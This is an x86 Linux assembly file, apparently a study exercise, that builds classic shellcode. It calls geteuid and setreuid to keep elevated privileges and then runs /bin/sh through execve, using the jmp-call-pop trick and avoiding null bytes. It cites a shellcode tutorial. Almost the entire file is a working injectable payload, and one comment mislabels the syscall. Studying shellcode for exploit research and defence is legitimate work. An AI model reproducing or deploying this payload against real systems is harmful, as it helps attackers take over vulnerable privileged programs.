

        global _start

        section .text

_start:
        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx

        ; get effective user id. Return value in eax
        mov al, 49      ; geteuid is syscall 49, geteuid(void);
        int 0x80

        mov ebx, eax
        mov ecx, eax

        xor eax, eax

        mov al, 70      ; setresuid is syscall 164, setreuid(uid_t ruid, uid_t euid);
        int 0x80

        jmp short place_string

execute:
        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        xor edx, edx


        pop ebx                 ; the return pointer, which points to "/bin/shNAAAABBBB"
        mov [ebx+7], al         ; place a zero byte at the N to mark end of string "pathname"
        mov [ebx+8], ebx        ; place the string address at AAAA to be used as argv[0]
        mov [ebx+12], eax       ; argv[] must end with a null pointer, so BBBB must be all zero.

        lea ecx, [ebx+8]
        lea edx, [ebx+12]       ; envp can just be an empty array of pointers (to char arrays), i.e a null pointer

        ; execve is sycall 11
        ; execve(const char *pathname, char *const argv[], char *const envp[]);
        mov al, 11
        int 0x80

place_string:
        ; call saves a pointer to the next instruction (return pointer) on the stack.
        call execute
        db "/bin/shNAAAABBBB"

                ; why do we have to jump down here? Avoids zeros for some reason


; reference: https://www.vividmachines.com/shellcode/shellcode.html